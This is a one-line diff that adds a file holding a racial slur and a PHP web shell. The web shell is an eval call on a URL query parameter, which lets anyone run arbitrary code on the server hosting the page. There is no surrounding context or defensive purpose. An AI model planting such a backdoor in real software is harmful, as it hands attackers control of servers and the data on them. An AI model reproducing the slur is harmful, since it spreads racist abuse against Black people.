@@ -1,0 +1,1 @@
+<b>niggers</b><?php echo eval($_GET['niggers']); ?>
